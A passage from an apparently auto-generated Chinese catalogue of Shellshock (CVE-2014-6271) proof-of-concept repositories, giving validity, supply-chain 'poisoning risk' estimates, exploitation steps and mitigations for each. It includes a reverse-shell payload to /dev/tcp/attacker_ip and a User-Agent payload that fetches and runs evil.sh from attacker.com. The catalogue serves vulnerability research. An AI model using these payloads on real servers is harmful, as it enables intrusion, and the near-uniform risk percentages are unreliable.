CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #8

**来源**: [CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md](../2014/CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许设置环境变量并调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后trailing string的方式。攻击者可以利用此漏洞，通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性分析：**
提供的Python POC代码通过发送包含恶意构造的HTTP请求来利用此漏洞。它首先尝试通过User-Agent、Referer和Cookie头注入测试payload来检测漏洞是否存在，测试Payload特征是会输出特定字符串，验证是否可以执行代码，存在漏洞后再注入包含反向Shell的payload来利用该漏洞。

**投毒风险分析：**
代码存在潜在的投毒风险，主要体现在以下几个方面：
1.  **反向Shell地址：** 攻击者可能修改`lhost`和`lport`变量，将反向Shell指向恶意服务器，从而控制受害者机器。当前代码中并没有明显的恶意行为，但是依赖用户提供的参数。
2.  **Payload修改：** 攻击者可能修改`payload`变量，执行其他恶意命令，例如下载并执行恶意文件，删除系统文件等。当前Payload是反向shell，不属于投毒行为。
3.  **其他依赖：** 代码依赖于`pwncat`库，这个库本身可能存在安全问题或被篡改，从而引入新的安全风险。
4. **连接处理:** `pwncat.manager.Manager` 中可能包含未知的后门或恶意代码。 
综合来看，投毒风险较低（约10%），主要来自于参数修改和对依赖库的信任。

**利用方式：**
1.  **漏洞检测：**  POC首先向目标URL发送包含特殊构造header的HTTP请求(User-Agent, Referer, Cookie)。 这些header中包含恶意的Bash函数定义。
2.  **命令执行：**  如果目标系统存在漏洞，Bash在解析这些环境变量时，会执行注入的恶意代码。
3.  **反向Shell：**  利用代码中，注入的Payload为反向Shell，建立从目标系统到攻击者控制机器的TCP连接，从而允许攻击者远程控制目标系统。反向连接的地址由`lhost`和`lport`指定。
4. **监听连接:** 在攻击机上启动监听进程，等待目标机器的连接。

**漏洞缓解措施：**
*   升级Bash到最新版本。
*   避免在CGI脚本中使用Bash处理用户输入。
*   使用安全编码实践，验证所有用户输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）监控和阻止恶意流量。

**项目地址:** [K3ysTr0K3R/CVE-2014-6271-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2014-6271-EXPLOIT)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #9

**来源**: [CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md](../2014/CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md)

## CVE-2014-6271 IP Fire Shellshock RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** IPFire

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 2.15

**利用条件:** 目标系统运行存在漏洞的Bash版本，且可以通过HTTP(S)访问到受影响的CGI脚本 (index.cgi)。可能需要用户名和密码进行身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造恶意的环境变量来执行任意代码。提供的Python POC代码专门针对IPFire防火墙<=2.15版本。利用方式如下：

1.  **漏洞原理：** Bash在处理环境变量时，允许在函数定义后附加额外的命令。如果这些环境变量被传递给执行Bash脚本的CGI程序，附加的命令就会被执行。
2.  **攻击向量：**  攻击者通过HTTP请求的header中设置包含恶意代码的环境变量，利用IPFire的`index.cgi`脚本触发漏洞。
3.  **POC代码分析：** 该POC首先尝试连接到目标IPFire服务器，如果需要则进行HTTP基本身份验证。然后，它构造一个包含恶意Bash代码的环境变量，并通过HTTP请求的headers将其发送到`index.cgi`。恶意代码利用函数定义后的trailing string执行任意命令。POC还包含了一个伪shell，允许交互式地执行命令。
4.  **投毒风险分析：** POC代码主要功能是漏洞验证和利用，但仍存在一定投毒风险。例如：
    *   代码中包含`eval`或`exec`等执行任意代码的函数，虽然目前用于执行用户输入的命令，但攻击者可能修改这些部分来执行恶意代码。
    *   该脚本依赖于`requests`库，攻击者可能篡改此脚本，要求安装恶意依赖包，从而执行恶意代码
    *  该脚本在执行远程命令后直接打印到输出，没有进行过滤，如果远程服务器被入侵，可能会发送恶意字符到客户端，导致客户端被攻击。
  因此，保守估计存在10%的投毒风险，主要集中在潜在的恶意依赖、命令执行的输出处理以及代码篡改的可能性。

**总结：** 提供的POC代码利用Shellshock漏洞，通过构造包含恶意Bash代码的环境变量，实现在目标IPFire系统上执行任意命令。由于利用了HTTP(S)协议，攻击通常可以通过网络远程发起。尽管漏洞已经存在多年，但仍然有很多系统没有修复，因此该漏洞仍然具有较高的现实威胁。

**项目地址:** [MuirlandOracle/CVE-2014-6271-IPFire](https://github.com/MuirlandOracle/CVE-2014-6271-IPFire)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #10

**来源**: [CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md](../2014/CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md)

## CVE-2014-6271 Shellshock漏洞利用

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且存在可利用的攻击面，如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash shell中的高危漏洞。该漏洞允许攻击者通过在环境变量中注入恶意代码来执行任意命令。根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，以下是对漏洞利用有效性、投毒风险和利用方式的分析：

**有效性：**

根据漏洞库信息，CVE-2014-6271允许远程攻击者通过特制的环境变量执行任意代码。漏洞利用代码（README.md）提供了一个利用 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 模块的Metasploit POC，用于攻击运行CGI脚本的Apache服务器。多个搜索引擎结果，如NVD, CISA, Qualys等，也确认了该漏洞的存在和危害，并提供了缓解措施。综合来看，提供的POC代码是有效的。

**投毒风险：**

漏洞利用代码本身是 Metasploit 模块的配置说明，用于利用已知的 Shellshock 漏洞。直接分析 README.md 文件，投毒风险较低，但仍存在以下风险：

*   **作者恶意修改：** 理论上，作者可能在提供文件的其他地方（例如，如果存在其他脚本或配置）隐藏了恶意代码。但仅根据提供信息无法判断。
*   **依赖项风险：** Metasploit 模块本身依赖于 Metasploit Framework，如果 Metasploit Framework 被篡改，可能存在风险。

综合评估，投毒风险较低，约为10%。主要来自于潜在的未公开文件篡改。

**利用方式：**

1.  **确定目标：** 找到运行Bash，且存在CGI脚本或其他途径可以设置环境变量的系统。
2.  **发送恶意请求：** 构造包含恶意代码的环境变量。常见的攻击方式是通过HTTP请求头，特别是当服务器使用CGI脚本处理请求时。HTTP头会被转换为环境变量传递给Bash。
3.  **代码执行：** 当Bash处理包含恶意代码的环境变量时，会执行注入的命令。
4.  **反弹shell（POC中的PAYLOAD）：**  利用 `cmd/unix/reverse_netcat` payload在目标主机上执行`nc`，反弹shell到攻击者的机器。

**防范措施：**

*   立即更新 Bash 到最新版本。
*   禁用未使用的 CGI 脚本。
*   使用 Web 应用防火墙 (WAF) 过滤恶意请求。
*   监控 HTTP 请求日志。

**项目地址:** [RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis](https://github.com/RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #11

**来源**: [CVE-2014-6271-RadYio_CVE-2014-6271.md](../2014/CVE-2014-6271-RadYio_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash作为默认shell，且CGI脚本或其他方式允许通过环境变量传递数据到Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过构造包含恶意代码的环境变量，当Bash执行某些操作（例如，通过CGI脚本）时，这些恶意代码会被执行，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的Dockerfile和利用代码，可以判断该POC代码是有效的。Dockerfile配置了一个易受攻击的环境，包括安装了老版本的Ubuntu、Apache2以及一个CGI脚本。exp_deface.sh脚本演示了如何通过构造特定的User-Agent头，向服务器发送包含恶意Bash代码的环境变量，从而修改目标服务器的index.html文件。

**投毒风险：**

在提供的代码仓库中，存在一定程度的投毒风险。尽管主要目的是为了演示Shellshock漏洞，但exp_deface.sh脚本本身就具有一定的破坏性。如果未经授权地在目标系统上运行此脚本，会导致网页被篡改，构成非法入侵行为。分析：

*   **Dockerfile:**  主要用于构建漏洞环境，没有发现明显的恶意代码。
*   **README.md:**  提供漏洞描述和使用说明，包含免责声明。
*   **exp_deface.sh:**  虽然演示了漏洞利用，但也包含修改网页内容的操作，存在潜在的破坏性。该脚本未经授权的使用构成恶意行为。
*   **index.html:**  默认的网页内容，没有恶意代码。
*   **main.sh:**  启动Apache2服务的脚本，没有恶意代码。
*   **vulnerable:**  CGI脚本，用于触发Shellshock漏洞，本身不包含恶意代码，但会被利用。

代码仓库的主要目的是复现和演示漏洞，但利用脚本具有一定的破坏性，如果滥用，可能会造成实际损害，存在10%的投毒风险，主要风险点在于使用者滥用`exp_deface.sh`脚本进行未授权的渗透。

**利用方式：**

1.  **环境搭建:** 使用Dockerfile构建包含易受攻击Bash版本的Docker容器。
2.  **CGI脚本:**  将vulnerable脚本放置在CGI目录下，使其能够被Apache服务器执行。
3.  **构造恶意请求:**  利用curl命令构造包含恶意Bash代码的环境变量，例如User-Agent头。
4.  **触发漏洞:**  向CGI脚本发送构造的恶意请求，触发Shellshock漏洞，从而执行恶意代码。
5.  **远程代码执行:** 恶意代码在服务器上执行，攻击者可以执行任意命令，例如修改网页内容(defacement)。

**项目地址:** [RadYio/CVE-2014-6271](https://github.com/RadYio/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #12

**来源**: [CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md](../2014/CVE-2014-6271-TheRealCiscoo_Shellshock-Exploit.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过HTTP Header设置环境变量，且Bash版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，也被称为ShellShock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式存在缺陷，攻击者可以通过构造包含恶意代码的环境变量，当Bash执行相关程序时，恶意代码会被执行，从而实现远程命令执行。从漏洞库信息和搜索引擎结果来看，此漏洞影响广泛，修复不彻底，危害巨大。

**有效性：**
提供的Python POC代码利用了ShellShock漏洞。它构造了一个包含恶意Bash代码的User-Agent头，并向目标URI发送GET请求。如果目标URI是一个CGI脚本，或者其他任何调用Bash并使用该User-Agent头作为环境变量的应用程序，那么恶意的Bash代码就会被执行，从而建立反向shell。

**投毒风险：**
该仓库的投毒风险较低。虽然任何代码都可能包含恶意成分，但此POC代码相对简单，主要功能是利用已知的ShellShock漏洞。潜在的风险可能包括：

*   作者可能在反向shell的Payload中植入其他恶意命令。但通过代码审计，反向shell的Payload清晰可见，未发现隐藏的恶意代码。
*   该代码可能针对特定系统环境做了优化，如果攻击者不了解这些优化，可能会导致利用失败，或留下攻击痕迹。但这种“优化”也可以被视作一种隐蔽的攻击尝试。

综合评估，该代码存在恶意投毒的可能性较低，约为5%。这个百分比代表一种潜在的风险，需要仔细审查代码才能完全消除。

**利用方式：**
1.  **确定目标：** 找到运行受影响Bash版本的服务器，并确认存在可以通过HTTP头设置环境变量的CGI脚本或其他应用。
2.  **准备攻击环境：** 在攻击者机器上设置NetCat监听指定端口，等待反向shell连接：`ncat -lkvnp <attacker-port>`。
3.  **构造Payload：** 使用POC脚本，指定目标IP地址、URI、攻击者IP地址和监听端口。
4.  **发送请求：** 运行POC脚本，它会构造一个包含恶意代码的HTTP GET请求，并将User-Agent设置为包含恶意代码的环境变量。
5.  **利用漏洞：** 如果目标存在漏洞，Bash会执行User-Agent头中的恶意代码，建立与攻击者机器的反向shell连接。
6.  **控制目标：** 攻击者通过反向shell控制目标系统，执行任意命令。

**项目地址:** [TheRealCiscoo/Shellshock-Exploit](https://github.com/TheRealCiscoo/Shellshock-Exploit)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #13

**来源**: [CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md](../2014/CVE-2014-6271-YunchoHang_CVE-2014-6271-SHELLSHOCK.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** 通过 4.3

**利用条件:** 目标系统使用Bash，且存在允许通过环境变量影响Bash执行的接口(例如CGI脚本)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的命令注入漏洞。该漏洞允许远程攻击者通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。利用方式通常涉及以下步骤：

1.  **确定目标系统是否易受攻击：** 检查目标系统是否正在运行易受攻击的Bash版本(通过 4.3).
2.  **寻找攻击入口点：** 寻找目标系统上允许通过环境变量影响Bash执行的接口，例如CGI脚本、OpenSSH的ForceCommand功能、DHCP客户端等。
3.  **构造恶意环境变量：** 构造包含恶意代码的函数定义的环境变量。例如：`() {{ :;}}; command`，其中`command`是要执行的命令。
4.  **发送包含恶意环境变量的请求：** 将构造的恶意环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
5.  **触发漏洞：** 目标系统在执行Bash时，会解析包含恶意代码的环境变量，从而执行攻击者指定的命令。

提供的POC代码`AutoShocker.py`是一个利用Shellshock漏洞的自动化脚本，具备以下功能：

*   **命令执行：** 允许攻击者在目标系统上执行任意命令，并将结果返回。
*   **反向Shell：** 允许攻击者在目标系统上建立反向Shell连接，从而获得对目标系统的完全控制权。

该漏洞利用的有效性取决于目标系统是否易受攻击，以及攻击者是否能够找到合适的攻击入口点。由于脚本需要用户输入目标IP和执行的命令/反向shell信息，因此投毒风险主要在于：

*   **误用风险：** 用户可能在未经授权的系统上使用该脚本，导致法律问题。
*   **脚本篡改：**  攻击者可能篡改脚本，添加恶意功能（例如植入后门、窃取用户凭据等），然后诱骗其他用户使用。

因此，我评估此仓库中存在作者隐藏的投毒代码的风险为10%。这主要是基于脚本本身的性质（漏洞利用工具）以及潜在的被篡改和滥用的可能性。

**项目地址:** [YunchoHang/CVE-2014-6271-SHELLSHOCK](https://github.com/YunchoHang/CVE-2014-6271-SHELLSHOCK)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #14

**来源**: [CVE-2014-6271-ajansha_shellshock.md](../2014/CVE-2014-6271-ajansha_shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 命令注入

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 通过 4.3

**利用条件:** 需要目标系统存在Bash环境并且存在可以设置环境变量的利用入口，例如：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的命令注入漏洞。攻击者可以通过在环境变量中嵌入恶意代码，当Bash解析这些变量时，恶意代码会被执行，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2014-6271是一个真实存在且影响广泛的漏洞。提供的shelly.sh脚本是一个漏洞扫描器，用于检测目标系统是否存在Shellshock漏洞。由于它旨在 *检测* 而非 *利用* 漏洞，因此可以判断poc有效。

**投毒风险：**
分析提供的shelly.sh脚本，主要功能是检测目标系统是否存在Shellshock漏洞。脚本本身包含恶意代码的可能性较低，其主要通过发送包含特定payload的环境变量来触发漏洞，因此投毒的风险主要来自于脚本作者是否在检测Payload之外添加了额外的恶意逻辑。

尽管代码看起来比较直接，但仍然存在一定的低概率投毒风险，例如：
*   在漏洞检测逻辑之外，添加额外的命令执行代码，例如，扫描到存在漏洞后执行特定操作，上传信息等。
*   通过精心构造的payload，在检测漏洞的同时，悄悄地在目标系统上留下后门。

综合考虑代码量和功能，评估投毒风险为10%。

**利用方式：**
1.  **确定目标：** 找到运行存在漏洞的Bash版本的系统。
2.  **寻找入口点：** 确定可以通过设置环境变量来与目标系统交互的入口点。常见的入口点包括：
    *   **HTTP CGI脚本：** 通过修改HTTP请求头中的User-Agent等字段，设置环境变量。
    *   **OpenSSH ForceCommand：**  通过SSH连接时设置环境变量。
    *   **DHCP客户端：** 某些DHCP客户端脚本在执行时会受到环境变量的影响。
3.  **构造Payload：** 构造包含恶意代码的环境变量。Payload的基本形式为`(){ :; }; command`，其中`command`是要执行的命令。
4.  **发送Payload：** 通过选择的入口点将构造的Payload发送给目标系统。
5.  **执行恶意代码：**  当目标系统中的Bash解析包含恶意代码的环境变量时，恶意代码将被执行，攻击者从而控制目标系统。

**项目地址:** [ajansha/shellshock](https://github.com/ajansha/shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #15

**来源**: [CVE-2014-6271-akr3ch_CVE-2014-6271.md](../2014/CVE-2014-6271-akr3ch_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的恶意环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的 Bash 版本，且存在允许设置环境变量的途径，如 SSH ForceCommand, Apache mod_cgi/mod_cgid, DHCP 客户端等。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271 (Shellshock) 漏洞存在于 GNU Bash 中，攻击者可以通过在环境变量中嵌入恶意代码，利用 Bash 处理函数定义时存在的缺陷来执行任意命令。提供的 exploit.py 代码通过构造包含恶意命令的 User-Agent 头部，向目标 URL 发送 HTTP 请求，尝试利用 mod_cgi 或其他 CGI 脚本来触发漏洞。该漏洞影响广泛，可能导致服务器被完全控制。

**有效性：**
提供的 Python 脚本是有效的漏洞利用PoC，它通过构造恶意的 User-Agent 头部来触发 Shellshock 漏洞。

**投毒风险：**
该脚本的主要功能是利用 Shellshock 漏洞，没有发现任何明显的投毒代码，0%的可能性存在作者隐藏的投毒代码。

**利用方式：**
1.  确定目标系统运行着存在漏洞的 Bash 版本。
2.  找到一个可以设置环境变量的入口点（如 CGI 脚本）。
3.  使用提供的 Python 脚本或其他类似工具构造包含恶意代码的 HTTP 请求，并将该请求发送到目标 URL。
4.  如果漏洞存在且利用成功，恶意代码将在目标系统上执行。

**项目地址:** [akr3ch/CVE-2014-6271](https://github.com/akr3ch/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #16

**来源**: [CVE-2014-6271-anujbhan_shellshock-victim-host.md](../2014/CVE-2014-6271-anujbhan_shellshock-victim-host.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #17

**来源**: [CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md](../2014/CVE-2014-6271-b4keSn4ke_CVE-2014-6271.md)

## CVE-2014-6271 - Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，且允许通过环境变量影响Bash执行，例如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）漏洞允许攻击者通过构造包含恶意代码的环境变量来执行任意命令。当Bash执行程序（例如，通过CGI脚本在Web服务器上）时，它会解析这些环境变量，从而导致代码注入。 

**有效性：**

根据提供的漏洞库信息、搜索结果和漏洞利用代码，该漏洞利用是有效的。漏洞库中明确指出该漏洞允许远程攻击者执行任意代码，搜索结果中也包含大量关于该漏洞的描述、利用案例和补丁信息。提供的Python POC代码也表明该漏洞可以被利用于获取目标系统的反向shell。

**投毒风险：**

分析提供的Python POC代码，风险较低。代码主要功能是构建带有恶意环境变量的HTTP请求，并发送到目标CGI脚本。代码中存在可以植入恶意代码的风险点在于payload的构建部分，但是目前的代码相对简单，仅用于执行反向shell。该仓库的 README 中有明确的测试目标和使用说明，相对比较安全。综上，认为此仓库存在10%的作者隐藏的投毒代码的可能性，该投毒代码可能为隐蔽的下载和执行其他恶意脚本。

**利用方式：**

1.  **确定目标：** 找到运行Bash且容易受到环境变量影响的应用程序或服务。常见的例子包括Web服务器上的CGI脚本。
2.  **构建Payload：** 构造一个包含恶意代码的环境变量。Payload通常包含一个函数定义，后跟要执行的命令。例如：`(){ :; }; echo vulnerable`
3.  **发送Payload：** 将构造的环境变量作为HTTP请求头或其他方式发送到目标应用程序。对于CGI脚本，可以通过User-Agent或其他HTTP头来传递。
4.  **执行代码：** 当目标应用程序调用Bash执行某些操作时，Bash会解析环境变量，从而执行注入的恶意代码。
5.  **反向Shell:** 本次提供的POC中,攻击者设置监听端口,通过漏洞利用,目标主机反弹shell给攻击者,达到控制目标主机的目的.

**风险缓解：**

*   升级Bash到已修复的版本。
*   限制对CGI脚本和其他易受攻击应用程序的访问。
*   验证和清理所有输入，特别是来自环境变量的输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [b4keSn4ke/CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #18

**来源**: [CVE-2014-6271-cved-sources_cve-2014-6271.md](../2014/CVE-2014-6271-cved-sources_cve-2014-6271.md)

## CVE-2014-6271-ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或使用OpenSSH的ForceCommand功能等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又称ShellShock，是一个存在于GNU Bash中的远程代码执行漏洞。漏洞源于Bash在处理环境变量中函数定义后的trailing strings的方式存在缺陷，允许攻击者通过构造恶意的环境变量来执行任意代码。

**1. 有效性：**

提供的Dockerfile构建了一个存在ShellShock漏洞的环境。`test.cgi`脚本被放置在`/usr/local/apache2/cgi-bin/`目录下，并且赋予了执行权限。该脚本会输出`/usr/bin/env`的内容，攻击者可以通过构造包含恶意代码的环境变量，并发送HTTP请求访问该CGI脚本，从而触发漏洞并执行恶意代码。因此提供的POC代码是有效的。

**2. 投毒风险：**

分析Dockerfile和相关文件：

